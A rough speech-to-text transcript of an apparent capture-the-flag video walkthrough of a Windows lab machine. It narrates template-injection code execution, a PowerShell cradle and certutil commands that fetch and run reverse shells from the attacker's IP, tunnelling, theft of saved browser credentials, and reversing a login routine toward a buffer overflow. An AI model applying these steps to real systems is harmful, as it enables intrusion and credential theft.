 what's going on youtube this is ipsec i'm doing handcliff from hack the box which has a lot going on in it it starts out with a server-side template injection in java which is a little bit different but not really it gets a shell on the box you have to upload chisel so you can tunnel to a unified remote app which if you have installed a application on your phone that acts as a mouse on your computer there's essentially that there's no authentication so if you can connect to the socket you can send keystrokes and get a shell as the logged in user which has a firefox profile that has a save credential that gets you access to a different user there's ability to download a custom application on the box that's vulnerable to a buffer overflow but there's a twist on it you have to do a socket reuse on this buffer overflow because there's not a lot of stack space to work with so you create an extra receive call that allocates a larger buffer where you can send your shell code in it's something i've read about a few times but never actually done it so hopefully it makes sense how i do it um let's just jump in as always we're gonna start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it handcliff and then the ip address of 1010 11.115 this can take some time to run so i've already ran it and looking at the ports we have three ports open it looks like the first one being http on port 80. it's running engine x we also have a http service on port 8000 running engine x the same exact version however the difference is the title for both of these is different the port 80 is just the blank welcome to engine x banner while port 8000 is hash pass an open source stateless password manager we also have port quad 9s open and nmap doesn't exactly know what that is that's why the service has a question mark in it it's just guessing based upon the abyss service normally listening on this port if we look at it though we have a banner that just says welcome asking for username and password so i bet if we nc 1010 11.115 on port quad nines we do get a blank password thing and it just says username and password incorrect so we can try creating a custom like brute forcer for this and i notice i misspelled please or we can begin enumerating the websites so the very first thing i'm gonna do is run a go buster so i'm gonna do go buster dir um dash u for url http uh 1010 11.115 and i want to go over to this engine x page so 1010 11.115 and let's try like index.php to see if it has php files um robots.txt although nmap would automatically display that so we don't really know the extension here so i can't specify an extension and go buster so i'll just leave it at dash u and we'll do opt word list or opt sec list then discovery um after that we can do web content raft small words dot text and one thing we can also do with this box or any box we can always send a ping message and the reason why i'm doing that is because i want to look at the ttl this ttl is 127 which means this is most likely a windows box if i pinged a linux box the ttl is going to be like 6463 the ttl documents by one every time you hop between a router and like 12701 that's my localhost so it's 64. if it was a hack-the-box machine where there's one hop in between us it would be a ttl of 63. so windows is 128 the ttl for that was 127 so i'm guessing this is a windows box we can confirm this because the windows file system is not case sensitive unlike linux so if i do index.html we get that if i put some casing like capital n and capital e we also get this banner if i did not do that we get the 404 page so it having that ttl and also the url being case insensitive are both clues this is a windows box even though we don't have like port 445 open so i'm going to change my brute force and we're going to do dash lowercase.txt because we don't have to do any case sensitive things so you can just do l for out file go busto.out and while that runs let's go take a look at port 8000 so taking a look at 8 000 this is hash pass a stateless password manager if i do like ipsec website of ipsec dot rocks i'll put the pass master password up please subscribe we click generate password and it gives us a password for that website if i oh man it deleted everything that's annoying um if i do like hackthebox.com and master password of please subscribe it's going to give us a different generated password so it's using the combination of probably name website and master password to generate this random thing it's just a little bit more secure than like doing um website password ipsec and like so hack the box would be my password be hack-to-box ipsec and the password for ipsec rocks would be ipsec rocks ipsec like just creating a unique password per website is what this thing is doing i can just google it by google hashpass um probably add github we can see it is an open source product we could look at the issues see if there's any recent like um security issues while a go bust is running uh there's literally nothing in here so no issues going back to go buster we do have maintenance being routed to nuxio maintenance so let's go over to exploit db we can type hash pass to see if there's a vulnerability if something does come up i'm guessing it would just be like a generator if you know someone's master password but nothing here we can look at nuxio and see if there's anything here and we do have a rce so let's go take a look at this web page so if i go to 10 10 11 115 then nuxio uh we have to do i think we slash maintenance yeah slash maintenance so let's put this in uh i don't want to do slash nooks here maintenance it's redirecting me there i think let's intercept this with burp suite so we can see exactly what happens turn the proxy on go here so we get maintenance i'm going to intercept the response to this request for it and we can see it's responding engine x and sending us to nuxio maintenance so if i for this we're going to get it i also want to intercept the response to this one and we just get the 404 not found so let's go do a dir bust on this directory so i'm going to run go buster dir u http 101011.115 slash maintenance and let's do dash word list opt set list discovery web content ratsmallwords.txt and i'm going to google um naxio and i don't know why i um googled google noxio let's just say noxio is there a github for it is it open source looks like it is if we look at it it is java and let's see i'm guessing this is going to be the extension jsp because it is java so we can just add that extension for raph small words and brute force this as well and let's take a look at this so if i go slash maintenance slash index page not found if i do something this is a different for a for error message right so if i do something here we get that 404 not found this one is different right and if i intercept this in burp suite let's go burp suite intercept intercept the response to this request we can see it's setting a um j session id token and this is indicative that it's probably tomcat on the back end so we have nginx in front of tomcat acting as a reverse proxy and as you probably know if you've watched a lot of the videos if we go to ipsec.rocks i really need to set up patterns so i don't have to keep disabling my foxy proxy but if i do this um tomcat nginx we have this ssrf talk um we can do tomcat apache as well so there's a vulnerability when we have nginx running with tomcat so let's see orange sci ssrf tomcat would be a good google to find this breaking parser logic and if i go down let's see where is it it's agenda so if i send these tomcat jetty wirefly and weblogic this is how they act so engine x i'm putting a semicolon name equals orange and then slash bar and tomcat ignores this whole piece and just goes to slash foo slash bar and this is important because if we are being um blocked via engine x config so if engine x is just saying hey don't allow them to slash manager i think manages the default tomcat manager tomcat url yeah slash manager slash html so if there's some engine x blacklist that's preventing us access to this file then we can just bypass it because if we put slash manager then this name equals orange slash html then our tomcat filter is no longer accessing it additionally we can go do directory traversal with dot dot semicolon so that's what i'm going to try doing real quick so i'm going to dot dot semicolon manager html see if we get a tomcat manager page we do not i'm also going to try slash manager and then it was what is it colon name equals something so we can just do semicolon name equals ip html see if we access the tomcat manager this way we do not so it's not vulnerable to this however if we go back to our go buster 10 10 11 115 maintenance so it looks like a go buster timed out there oddly enough but if i try like index.jsp we get this we'll be back soon and if i do dot dot semicolon index.jsp [Music] we go to this slash nuxio slash nx startup faces so we got some weird path traversal here in order to access um noxia so for pretty much everything we want to do this inside of burp suite so if i kill this one we no longer need go bustering we're intercepting let's go here burp suite and we can try dot semicolon index.jsp and see exactly what the server sends up so respond intercept this response it's directing us to slash noxio and then we're going to get this so i wonder if i do slash maintenance slash dot dot semicolon like that if we actually access the file we have a login.jsp so again i'm going to maintenance so i can access this file so we're bypassing some engine x um filter and that did not work let's try maintenance login.jsp and we get to the noxio login portal so we could try like brute forcing with admin admin or things like that but i'm just going to go over to google and see if there's any known vulnerabilities for this that's not on exploit db so noxio exploit search it we have a unauthenticated rce analysis which i mean unauthenticated exploits are always great if i went to exploit db it was remote code execution and this one was authenticated but over here we have an unauthentic n1 then pulling docker to run it let's see exactly how this one works slash login vulnerability analysis where is the vulnerability i'm not sure this is it let's see is there a different one we have this github repo of cve 2018 let's see if we can find a write-up for it so googling the cve if we can't we'll just look at the um python code vulnerability scanner pointing to the exact github repo we have go over here so let's see this is going to play we got the nuxir web service there and how is he going to access this so it looks like there is a server-side template injection in this url so let's try this out real quick and of course if we just cheated and looked straight at this we would find it but i think this came out after the box was released so if i do slash ipsec.xhtml here we get this facelit error not found and if i specify like an ssti let's do oneplus one it goes like this however if we do like payload all the things ssti pull it up i probably should have clicked that next one template injections server side come on it's loading click on java we can see ssti is not just the double brackets we need to put a dollar sign so let's try a dollar sign before this oneplus is one we have error has occurred let's just do with one bracket and we have ipsec2.html when we request oneplus one so let's go over and send this over to burp suite now and then we can build a weaponized poc for this so again we have ipsec 2 if i did instead of 1 plus is 1 we can do seven times seven and we should get 49. so just the fact that we're coercing it to do math tells us we can probably get it to do other things so now i would be going back to the payload all the things and find one that gets code execution so let's see retrieve java ginger 2. um i'm looking for one i guess maybe we can just try let's try this one see what happens here with this get environment so let's just copy and paste it and let's see i'm just going to always get in the habit of url encoding this whole thing because when you do these type of payloads there's a lot of bad characters and i just got a 500 error i'm not exactly sure what happened there see if we do it without encoding we get 400 so maybe this whole like payload thing just is not good or this exploit is not good for it so we just have to do a little bit of trial and error finding out the right exploit and i swear there were more of these we can try this exact and see exactly what happens so if i just paste it in instead of exacting a cat i'm just going to exact who am i and we can copy or url encode everything send it and we still have that generic error message has occurred so what i'm going to do is search for other ssti i'm just going to do dollar then bracket and we can see other things um this is expression language and it's a mechanism with jsp and java so this looks like it could be helpful um i don't know what this like um hashtag thing is the hashtag session get a tribute let's see that's like doing a process builder to get a lot more like i don't want to do five lines to do cmd.exe let's see this one is just exacting calc let's try this so i'm going to go over we can paste it and instead of calc i'm going to switch it back to who am i and see if we get its username outputted to us so let's copy this entire selection or url encode it send it and we have the error message and something's weird it's saying ipsec then java laying process so it's giving us like the object it's not reading the actual text but it looks like it's executing code um we just can't see the output so i'm going to un-url and cure this and let's verify it by doing a ping so i'm going to do ping 10 10 14 8 and we'll do sudo tcp dump dash i ton 0 icmp i'm also going to add a dash n so we don't do any dns resolution and we should url encode this whole thing so convert selection url and code all characters we send it immediately get this message saying this but if we go here we see it pinged us four times which is the default for windows if you're doing it on linux um definitely add i think the dash c flag or maybe it's dash n yeah dash c for linux it's dash n on windows because it'll do an indefinite ping which can hang a web server just cause issues so generally when doing pings you should always specify the count but on windows it's safe to just bypass that and not do it so at this point we can try to get a reverse shell um i stop don't want to pull that up and since i'm working inside of an exploit there's probably going to be a lot of bad characters like i can't use all these quotes and things like that so i'm going to use just powershell and paste in some base64 so to do that i'm just going to create the string here so we'll do ix new object net dot web client download string then http 10 10 14 8 shell dot ps1 and that should be all we need i'm going to do i convert dash t and then it's utf-16 little endian and this just puts it in a format windows based 64 likes and it just wants everything to be 16 bytes so if i did not do that dash t you would see if not everything's just like one byte instead of having this null byte so we can do base64-w0 we get this big base64 object we can copy and type powershell dash enc and paste that in and then what we have to do is um make a web directory and put shell.ps1 there so i'm going to copy user share nishang then shells and invoke powershell tcp dot ps1 to just shell.ps1 and we can just edit it i'm going to take this one liner to send reverse shell put it at the bottom after it loads it and then we can change the ip to be myself so 10 10 14 8 and i always like port 9001 no reason it's just what i like to do and then pseudo python 3 dash m http server port 80 and we can say nc actually before nc or lrap netcat lvnp 9001 and rlwrap just gives us the ability to do the up and down arrow so nothing too special there um [Music] i'm going to copy this so not copy but highlight selection url encode all characters send it we go back here and we can see it got our shell and we have the reverse shell the first thing i always like doing whenever i get a shell is running the who am i slash all you'd also just do like the slash prize because really that's what you're after just see what privilege you have to see if there's an easy private with like essie impersonate there isn't and if we scroll up we can see we are the handcliff service account so we know here we are there's not a quick private there the other thing i like doing is like running windpeas but before i do that because there's just so much output um i want to see exactly what is listening on that port 9999 and oxdf had a really good blog post that he found if you just google like netstat listening ports powershell i believe um this has a really clever one-liner to be able to get a lot of good information on one line and let's see let's google it again netstat listening ports powershell go to this atom the automator thing and this whole guide is pretty good it's just kind of talking about how to do things but we just want to grab one snippet so he's using this get net tcp connection with state listen flag and he's going to select the object and get the process to get like a bunch of information from it so let's copy this paste it in and i don't know if it ran or not oh it did so it errors at the end i'm not sure what that's about but we can see a lot of information so we have like engine x and it's remote and report is quad zeros its local address is all zeros but its local port is 80. so i'm just going to run the same command and i'm going to do format table i could probably just do ft for short and then we can do dash property and what do we want we want let's see is there remote port is zero so we probably want local address and local port right so local address local port and before that i probably want the process name so if i run this command now we have pretty much what we want of network socket wise so we can see 9999 is svc host we have something here it's truncated um let's see format table maybe dash auto wrap i always forget how to um not truncate let's try like dash size 100 oh come on what if i put process name at the end if it'll still truncate see it still does so i need a search format table do not truncate because i don't know that off top my head how about without truncating come on uh dash width what's out string format table dash auto size let's try that dash auto size there we go now it's not truncating so java's listening on a lot all this stuff we can't access or that may not be um listening so we can also do oh man there we go if i say dash state listen now it's only going to show me the listening ports because i'm guessing some of those java connections up top were us connecting to the box so here's only listening we can see what port so 445 and 135 are but the firewall is blocking those because they did not show up on nmap um we have svc host running on 9999 we have this remote server win we have java we have my first app we got php which is probably for that engine x java which is probably noxio nginx again we two nginx processes we have a postgres database so we probably want to figure out how to connect to postgres and dump that those credentials but first i'm kind of curious what um remote server win is i would google my first app but it's clear that's a custom application so if we come across that on the server we should definitely take a look at it going here it says this is part of the unified remote so if i google unified remote exploit we do have something on exploit db which looks to be a python app so let's go and download it so if i go over to raw we can copy it we want to download it locally and then the issue we're going to have maybe ncat didn't or map doesn't scan it by default but port 9512 where that's listening is not accessible to us so this remote server win these ports are not accessible so i'm gonna have to tunnel to get them so let's move this to be unified remote dot pi and then we'll download a good friend chisel so i'm just gonna do chisel github and we will download a windows and linux one so go to releases amd 64 make sure you don't get the arm which i'm famous for so download this we can gzip g chisel move it to just be a better file name chmod plus x chisel and then we want to get the windows exe so amd 64 for windows copy link w get then gzip dash d chisel and then let's move this and dub dub dub and we'll call this chisel.exe and i just want to validate that is a executable based upon file it is so now we can download this file so i'm going to go into cd backslash program data which is generally where i like dropping files on windows and see if powershell has curl because it's just so much easier to type chisel.exe 1010 14 8 chisel.exe looks like it does we are downloading chisel and then see do i have send let's see yes i can send this to pain too can't join pain from window what that sucks so it looks like my sending between panes is not working i was hoping let's see let's just move our www server to pane2 sudo python3 m http server80 because i wanted to have two full console lines here so on our server we're going to do dot slash chisel specify server the port i like using 8001 for chisel because it defaults to 8080 which burp uses so i like using 8000 for python's web server and 8001 is generally what i use for chisel and we enable the reverse and then over here do a dir we have chisel.exe so execute that we specify client 1010 14 8 port 8001 i'm going to do r for reverse 9512 and then it's very very important to use 127.001 not localhost because if you do localhost then it may pick a ipv6 address and just weirdness happens where it may not work so 127.01 is a lot more reliable than localhost so run this if we did it correct we see session one has opened so we should have port 9512 listing on ourselves so if i do nc or ss lntp script 9512 that is now listening it's through chisel so let's go and take a look at this exploit so it's a python exploit and all this is doing is jamming packets on the wire and we see this dot decode hex this is a python 2 thing so this is a python 2 script and we've got our host lhost and payload so our host is actually going to be 127.001 our lhost is going to be ourselves so 10 10 14 8 and then the payload we don't know what that is so let's try taking a look at how this works so it's sending keys send return so what the unified remote is is just a application that enables you i think to control your computer via your phone it's like vnc and what this is doing is just pretty much executing a bunch of keystrokes to open a command prompt by sending string cmd.exe then using cert util to download something and then saving it to sql and windows temp to execute so let us build a payload and to do that i'm going to use msf venom dash l payloads and we want to do the um reverse shell so once this happens we should be able to search for what we want let's see reverse underscore shell cmd mainframe that's not what i want let's see um probably reverse tcp that's vnc inject here we go now there's two of these we have this shell slash reverse tcp and shell underscore reverse tcp when you see it slashed like this this is a staged payload so we'll need msf multi-handler to execute this because it's not sending the whole payload and sending a stub to tell the server to go to a web server which then sends the reverse shell if you see it with the underscore this is stage list and it puts it all in one big file and that's what we want because we just want to listen on one port so msfvenom dash p put this l host is equal to [Music] um 10 10 14 8 l port is equal to 9001 format exe dash o we'll call this rev.exe for reverse but i don't want to type reverse every time so i just called it rev and now it takes a little bit to run because it is ruby but there we go it is saved and i'm just going to copy this into my dub dub dub directory because i don't know where this python application is going to rate it to so it wanted um our host which because we're bending the port back to ourselves it's 127.01 and then we can just execute it this way and we see oh we didn't say unified remote so again it's a python 2 application so let's specify python 2 and it says it's opening command prompt doing the super fast hacker typing which is just doing cert util downloading and then going to try to execute and we did not listen on port 9001 but this exploit is actually going to have an issue because we don't have permission to write to sequel in windows 10 we could test that out by doing like we lost a shell here but we could just try writing there and we don't have access so let's try adding this exploit so unified remote and let's change this to be program data and then we also want to change where suit util is writing so change this to program data alternatively we could just drop the file ourselves and not deal with this cert util download thing so let's try this and see what happens so it's starting oh wait what we got a thing was that this i did not see when we got that shell that was weird let's see downloading payload yep so i don't know exactly when we got the shell but we do have it if we go to cd program data do a dir we can see rev.exe did download there and if we look at a web server it is downloading several times so um that's weird hold on how many times does it download for one run i know cert util is a weird program when you use it to download so if i just execute this and we wait here it may do like four requests to actually download it is that right so we got two it's gonna do any more it doesn't look like it but yeah uh it may have been like two for trying to download a sql in windows temp and maybe that worked um but yeah let's just continue on with the lights because we have a reverse shell but you can see i can't control l i can't do up and down because i forgot rl wrap so let's redo that and then we will have a good a semi good window shell and um continue on through this box actually uh i decided i did not want to continue just yet let's convert the script to be python3 because a lot of people doing this box may not have python 2 installed anymore so the issue is all these dot d code hexes we can replace that with from ben ascii import unhex lifi and then all we have to do is put unhexify and remove decodex so what i'm going to do put my cursor over here i'm going to hit qa and vim and you can see it's now recording a macro so i'm going to type on hex lefi then escape and i'm going to search for decode then we'll delete the rest of that i will hit q to end my macro and now if i just go to the open parenthesis i can say at a and it redoes that macro which i think was fine see hat a i can't tell if it's doing something bad or not the dangers of a vim macro i guess so do this i'm going to search for open parenthesis like that at a go next let's see maybe i need to do equals open like that at a next oh because my macro is overwriting my next search when i hit n it just goes to the next d code because my macro searches for decode let's see this one we just want on hexlfy here and then we pray i just typed that right there's no more decodes so if i do netcat here we can do python3 unified remote or hers is not defined yeah of course because we had to specify all the variables there we go and now the application is running and hopefully we still get our shell with python3 and when we do we can all cheer that now the script has been ported over successfully so as always i'm just going to run a who am i slash all and we can see our privileges because we did exploit our service and it didn't really give us any extra privileges we're just this clara user we could run that whole netstat thing again and find open ports but we already looked at that so now it's like hunting for the um like my first app exe and going into sequel and backslash i'm guessing it's going to be in dev app so i go in there and can't um access denied so at this point i decide you know what let's run some win ps so i'm going to google psng and go to the github page to download it if you didn't know i know i said in the last few videos but win peace has switched to just executables that you download and the actual like source code generates these executables so if you ever want it go to the releases and download it i'm going to go in www w get it we have win psne.exe so you can guess i'm going to go to program data so i can write it so curl dash o for out win ps.exe then http 1010 14 8 win psne.exe so this will download it we can execute it and then hopefully it gives us a tip on where to go next um i probably typed it oh i just called it windpeas dot exe there we go so gonna pause the video let this run because it'll probably take around two to three minutes to go through everything and generate six to seven thousand lines so win peas is now done so let's go up to the top and i don't even see six thousand lines at all so this one's much shorter than the last time i ran it so i'm just going to search for windpeas.exe to quickly go up to where we ran it and just look through everything so it does detect it is a virtual machine it was trying to use watson to look for unpatched windows vulnerabilities which i don't know if it's updated anymore looking at this last update was 2020 is a dev branch we can check that still 2020. so watson not really update anymore to look for windows vulnerabilities has some hotfix information so we could see like the time windows was updated i don't see any like 2022 patches so maybe uh colonel privest could be there because it's around six months old maybe i don't know at this point but i don't know of any oh day windows priv vests in the kernel lately so let's skip also past all those hot patches we have last shutdown time this is by when the machine was tested we have user environment variables we do have java in the class path and one thing i've noticed a lot with this a lot of times users can write to these directories in java and when you do you may have some type of dll injection for other things so i don't think it's vulnerable on this box but just something to keep in mind when you're doing other vulnerabilities or um persistence techniques to always look at like the java class path to see if underpriv low privileged users can write there we do have environment variables audit settings lapse w digest lsa credgard cash creds uac powershell settings we do have a history file with some data so maybe this time i'll remember to look at it let's do v notes paste that in put that on one line then let's keep on going powershell session i'm gonna left that's also like one of my powershell things except i didn't do powershell with clara because this is just um um reverse shell with meterpreter or not material just reverse shell with msf venom not executing powershell i must be an administrator to check i don't know if that's actually true we could certainly check like a windows directory for sysmon config that's often left behind so there's probably ways we could check for oh enumerating sysmon configuration not if sysmon's installed my bad yet you do need um administrative normally to read the configuration but you may be able to find the config file that's used to load it and have read access to that so this check may be better worded or maybe could use more refinement administrator to run those idle time we can see how long the box has probably been powered on oh that was weird i don't know why it stopped but there was an azure thing i liked um azure joined was it crap search for azure so this is not a azure machine that's pretty cool to be able to show that we have it looking at tokens nothing interesting there clipboard text we don't have anything logged in users so we can see this is me on the reverse shell this is me on this shell and uh i guess administrator has a local thing logged in what is this at information about users odp session that's weird interactive password policy logon services process information uh one drive we can't do hijacking there i just stopped because it was red uh we may be able to modify some services so we can start and stop them but we can't edit them so i don't think there's anything to do there start applications auto runs this auto run piece is pretty noisy i don't know if it's highly vulnerable i don't think we can exploit these known dll things and i see that quite often see authenticated users can create files in the task directory this is being pointed out most likely as a potential app locker bypass because a lot of people like white listing sql and windows list of all the processes so this is also doing the same thing we did manually of showing us running processes and their port um we just did it through powershot without running one piece ipv6 connections windows vault cred manager d pappy keys net ntlm uh i wonder if we could get claire's password i don't think we have that yet so maybe we could try cracking that uh we do have saved credentials for firefox localhost 8000 handcliff.htb and this handcliff development master key and it pulled that from this firefox database file at sql and user's clair app data firefox profile so this is the password manager so let's try logging into this so if i go to 10 10 11 115 port 8000 then let's see the full name we don't know that we have the username so maybe the username let's see i'm going to put handcliff.hcb for both and then i'm going to use this development master key and then generate password so we have this password so i'm gonna put that in notes uh was that it there we go i don't know i didn't paste the whole thing the first time then i'm going to do it with just the site the user can be something different i'm just making sure see if this gives us anything different based upon a username so the username does play a role in this so we need to figure out either username or website this goes to um see i'm going to just put these in handcliff hdb put this in and i want to check the users on the box to see if there's any we don't have if i do net user we have development and administrator we could try both of these we already know service account and clara but i'm going to start off with development because there's still that myapp.exe that we don't know so i'm guessing there's a step before we get to um administrative access so let's try development handcliff.hdb and this password we have this weird thing let's put this here and then we have to figure out a way to use this password and i'm going to just use chisel again we have it in a directory so i can just do chisel.exe client 1010 14 thousand one i'm going to do reverse 59 85 127 001 59.85 and then we're going to do 5986 again or and localhost again and these are the two winrm ports so we're just forwarding them both back to our box looks like it is connected so if i try evil dash when rm then we can do dash i um local host and then dash u development dash p we're going to get these notes so i can grab this and we can see if we can log in and we do so we are now the development user i'm going to go cd backslash see if i can get into that dev app directory again and we can so i'm going to download myfirstapp.exe and i'm also going to download restart.ps1 and we're going to reverse these so download restart.ps1 and before we do this i want to get back to um clara so let's do that let's see i think we did it here python 3 unified remote exploit oh my one shell has died that's still running weird uh ss lntp grep4 nine five it was nine five one two right let's see our lrap nine five one two so that session died let's start this up again uh we have a socket listening here we can execute this we get this and then we want to do program data and run this chisel command again because i want to get to the clara user and all i want to do is look at that stupid powershell history file i don't know why it's being such a pain so let's do nc lvmp 9001 maybe we should have just got her password with um that net ntlm thing but we can do it this way too okay now we're clara so we can grab this file and see what it says and then start that binary exploitation piece so type it's just doing ipo this is the um windows remote thing the cert util i'm guessing it's 1411. maybe this is from testing because it's going in temp but i was 14 8 so i don't know exactly how old this is but um this is definitely from testing or someone else because it's 11.8 so let's go back and make sure we have my first app.exe and i'm looking at file it is not a dot net thing so we have to reverse this the hard way so let's open up gidra with opt-gee dragydra run and we can see my version is a little bit outdated it's a few months old but i don't think that will matter all that much do new project and we'll just call it hand cliff and then it doesn't really matter because all we want to do is be able to click that little dragon icon and then hit i to import a binary select my first app.exe and it'll tell us it's importing as a 32-bit windows executable which is fine and now we're just going to choose all the default options and wait for this little thing to stop moving indicating that ghidra is done processing the binary so i'm going to go over to exports click on main and then i want to see exactly where i begin in this program if you remember from the very start of the video uh this was listed on port quad nines and it just asks for username so i'm just going to glance over the output to see if i see anything that says username and i'm not exactly seeing it so i'm going to go to search strings and then we're going to search for it here so i'm going to do user name click it and we can see the disassembly view changed i'm going to right click references show references to this address and we're going to look at it and now move this pane back over so in the decompiled output um if i highlight this i thought it would highlight over here exactly what it does but i don't see and highlighting in the code where we're at maybe i should do a few lines there we go so we can see clearly it's sending username then receiving putting on a variable if we go down a little bit it's calling this login function so i'm guessing this is going to be username and password um we can see ac stack 50 is right around this username so chances are that is what we want so i'm going to go into username and then it doesn't know exactly what type this is i'm going to guess boolean because we're returning 0 or 1 but we don't have to define this we can leave it as undefined the key thing is looking at these variables i don't know exactly what local 10 is but we assumed we were passing username and password to it if i look where param 1 is used it's used down here on line 25 and is comparing against local 10 which is this so i'm going to guess this is some hard-coded username and param1 will be user input so i'm going to call it input username and then over here if r2 this is the result i like just calling this variable r and whenever i see r in my head i think of result so if the compare matches and this next compare local 14 and local 28 match then return one so we passed the login we don't know what local 14 and 28 is 14 looks like it's a hard-coded password and then the next thing local 28 i'm trying to find that right here maybe this is going to be the username let's kind of trace param2 so param 2 moves over to local39 so i'm just going to call this pw and then we do local 18 we're doing encrypt 1 0 pw and this is going to be pw enc1 and then we're going to grab the length so this is len pw and c1 and then local 24 looks like this is going to be a second encrypt function result so i'm going to call this pwenc 2 and then pw enc2 i probably should of done it like that i think that would be a normal convention this is going to be length of this so len enc pw2 and here all we're doing is a compare so this is going to be another result but result of password and i'm going to call this result of user uh maybe this isn't resolved a password this is just base64 password my bad so pw b64 encoded there we go so now this starts making sense so if her username is alfensenya or i don't know how to pronounce that sorry for butchering it and the hard coded password is equal to or user inputted password after doing all these encryption routines then we pass login so we have to reverse this so let's take a look at exactly what encrypt 1 is and keep in mind the very first thing that we passed let's go back real quick back um encrypt one we passed zero i don't know exactly what that is for but the second time we encrypt we do pass a length so let's go back to encrypt um well param one isn't even used so this is zero is what we passed and then param two is going to be the password so here we are looping through and this is going to loop through the length of param2 so this can be land pw like that and this is going to be um a single character in the password or this i guess we can call it i right that's probably how you're used to seeing it so for i and the length of password keep going so we have this if then so if the um character is greater than space and the character is not equal to 7f so over here we probably just want to man ascii and we can see what space is so i think this one is hex right 32 let's see nope 20. so hex 20 is space so if the character is greater than hex 20 and it is not 7f let's look at what 7f is 7f is delete then we're going to go here and we're going to add 2f and i don't know exactly what 2f is um let's see if i do python3 f 47 so we're going to add 47 to the character so um care plus 47 and then we'll say if the character plus 47 is less than 7f which is the delete character then we're just going to set it to that value of character plus 47 else if that character is equal to 40 um if it's probably greater than 7f then we're going to subtract 5e from it and one thing about 7f that is rot47 you're probably familiar with i think rot32 is it for like ascii characters but rot 47 includes symbols so i'm going to go to cyber chef gchq and we're going to start this out so we'll say from base64 and then rot 47 oh rot 13 is that i don't know why i said 32 but yeah rot 13 would be the characters so this is upper lower and symbols i believe in rot 47 um i really don't know why i said rap32 32 was just on my mind but encrypt one we now know is rot 47 awesome so we want to go all the way back to login it's going to return that string so i'm just going to do search strings and we'll get back to user i can probably go to like functions and login and we can get there that way but maybe this weighs faster maybe it's not who knows show references to this welcome to brinks login successful so we go in here and we can see we already got the rot 47 documented so now we got to go into this encrypt 2 function and this one is a bit more different or difficult so pram 2 remember this was password length and param1 is going to be pw and this we can say is i so again we're just looping through the whole character and now we're going to say let's see local 11 pwi so this will be character so if the character is less than 41 or the character is greater than 5a and less than 61 or 7a so let's take a look at exactly what all these values are so let's go look at 41. let's do man ascii 41 that's a so if the character is less than a so this is going to be like symbols i guess or character is greater than 5a so z so again it's hitting some symbols and less than 61. i'm going to guess before 61 is symbols again and 7a sees these symbols after lowercase it is so we can say comments pre-comment and i'm just going to say if care is a symbol because that's essentially what the if statement does and if it is then we just this will be output so if it's a symbol we do nothing we just set it to be the output else um beaver is equal to care less than 5b we're adding 20 here so let's see i'm guessing this is a different way to do if thens so if character is less than 5b so what is 5b so maybe this is is uppercase because 5b is here 5a is z so maybe this is going to be uppercase so i'm going to set a pre comment real quick and then let's see do we have another one output z [Music] so it doesn't look like we really have what's b var1 so if b var1 and we have another if beaver one which is i guess a little bit weird actually nevermind um i just realized so this is going to convert to lower case so um 20 would be 32 i believe which would be the distance between an uppercase character and a lowercase character we can demonstrate that hold on let's just set this convert to lowercase ah that did not comment i guess i did the wrong type of comment comment set pre grab this plate pre comment there we go i typed it but we can demo this let's just do python 3 and we can grab the ordinal of a and uppercase and then we can add 0x20 we get 97 and if we convert that back to a character we get lowercase a so all it's doing here is if it's uppercase convert it to lowercase and then again here this is going to be let's do comments pre if uppercase then convert back to uppercase right so let's do comments convert back to uppercase so this function is only doing something on lowercase characters so if it gets an uppercase it converts it to lowercase does its little encoding and then converts it back to an upper case and up here we do have it like making sure we ignore symbols so whatever type of encoding this is it's only going to handle ascii characters so now the next thing to do is figure out exactly what this does so z minus the character plus nine f so let's go back here so we have z minus um we can do care a then plus 0x9f so it's like this let's see we want ordinal of a ordinal of z and we have negative 134 and we just have to add 256 here because it's like a weird signed issue we just it just drops the um is it lowest to highest byte it drops one byte in the binary format so we just add that back to sign it and we get 122 and if i do care of 122 we get z which is weird right so let's see what b is we have y and then c x uh d is w and it's now going backwards through the alphabet so it's like z y x w v u t s r q o m l i just messed it up um but it's just going backwards right every character we have it inverses it and chooses it from the other end of the alphabet so um what i'm going to do is just call this the at bash cipher because that's exactly what it is um if i google hat bash cipher and we look at this um a becomes z becomes y so it just reverses the alphabet so let's go at bash and this awesome so all that's left to do is now go back and grab that hard-coded password so maybe functions do we have a login right here so that's the other way we could do it maybe that way was faster than looking at the string but i can copy this we can paste it in and let's see we probably want to because we're decrypting it we want to do at bash first which is encryption2 then rot47 and we get this so let's try logging into the application i'm going to save this and i'm just going to put them down here so echo that and we also want to grab the username so let's grab this because i don't want to type these constantly backslash n uh that was weird oh because it has special characters in it that's annoying echo that and let's echo the username copy maybe it's the other clipboard there we go okay so i can do nc let's do nc 10 10 11 115 quad 9 grab this username and we can grab the password and we get logged in so we have full name so i do ipsec input code 123 and it says wrong code so if we go back into this let's go let's see we want to call where login is so i'm going to do show references we go back here and we can see after login we see login successfully and we're going to grab the full name it's going to do sdrn copy then input code and then it's going to call save creds i believe so i call save creds before it does this it looks like because we got right here where it says wrong code if i put this in i wonder if this is just going to say correct code let's see echo this shoot we're on clipboard again so is that the code let's go log in only enough okay there we go it just took a while to come back so username copy this the password full name i'm going to say ipsec and input code ipsec and we can't just loop here which is weird but that looks like it is potentially the code or it's doing something maybe not because we have unlocked right here so maybe it wants our username to be this so i'm going to copy this full name oh shoot wrong code never got to log in again so grab this grab the password what did somehow i change a password username or did i copy a single quote i don't know what happened there weird maybe i pasted a space let's try putting this as the full name just because i did see it in the assembly but this is the code it says unlocked and i have no idea what it's doing now it just ended so after unlocked doesn't do anything so let's look at this save creds and it's only doing a str copy here not a um sdrn copy and this is a vulnerable function so local 10 it doesn't look like we have a size but local 42 the size is 50. so we only allocated 50 bytes for this buffer so i'm going to go back and i'm guessing this one is going to be the code so p stack 36 so we got to figure out what the max length for code is defined as or we can just um do it the easy way and paste a bunch of data so let's try to log in okay full name doesn't matter and then this we probably just have to go a little bit above 50 because that's the allocated buffer so i'm going to paste a lot and it doesn't tell a strong code it just breaks down so i'm guessing this is going to be a buffer overflow so i'm going to switch over to a windows machine and i've already copied the application here and i'm going to load up x32 debug and we're going to analyze this so i'm going to open let's see we want to go over to desktop and then my first app and let's see run this a bunch we can see it started on port 9791 so i'm going to go over here and see 192 168 and i get this guy's ip address ipconfig 58114 so 58 114 and of course i got to get the port again because i did not remember it 9791 so 9791 and can i not connect to this guy connection received okay so let's do username then let's grab this password okay that's weird maybe the password like for some reason a hunt like it doesn't work 100 of the time i swear i have the right password let's do alphencia logan successful okay a-l-f-i-a-n-s-y-a-h i have no idea what just went on there uh ipsec is the full name and i may already have some breakpoints here or something yeah i hit a breakpoint so i'm going to view 